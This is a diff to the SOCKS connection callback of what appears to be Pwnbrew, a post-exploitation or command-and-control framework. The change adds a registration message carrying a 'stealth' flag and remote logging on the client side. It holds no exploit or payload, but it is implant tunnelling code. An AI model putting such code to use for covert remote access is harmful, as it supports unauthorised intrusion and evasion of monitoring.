@@ -37,10 +37,15 @@ The copyright on this package is held by Securifera, Inc
 */
 package pwnbrew.socks;
 
+import java.util.logging.Level;
+import pwnbrew.ClientConfig;
+import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.DataManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ConnectionCallback;
+import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.control.messages.SocksOperationAck;
+import pwnbrew.selector.SocketChannelHandler;
 
 /**
  *
@@ -75,7 +80,21 @@ public class SocksConnectionCallback extends ConnectionCallback{
     @Override
     public void handleConnection( int theChannelId ) {
         
-        if(theChannelId != 0 ){        
+        if(theChannelId != 0 ){      
+            
+            ClientConfig theConf = ClientConfig.getConfig();
+            byte stlth_val = 0;
+            if( theConf.useStealth() )
+                stlth_val = 1;   
+
+            //Queue register message
+            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, theChannelId);
+            DataManager.send(theManager, aMsg);
+
+            //Set send signal
+            SocketChannelHandler aSCH =  theManager.getPortRouter(theConf.getSocketPort()).getConnectionManager().getSocketChannelHandler(theChannelId);
+            if( aSCH != null )
+                aSCH.signalSend();
             
             SocksMessageManager aSMM = SocksMessageManager.getSocksMessageManager();
             aSMM.setChannelId(theHostId, theChannelId);
@@ -83,6 +102,8 @@ public class SocksConnectionCallback extends ConnectionCallback{
             retMsg.setDestHostId( theHostId );
             DataManager.send(theManager, retMsg);
 
+        } else {
+            RemoteLog.log(Level.INFO, NAME_Class, "handleConnection()", "Channel ID returned 0", null );
         }
     }
     
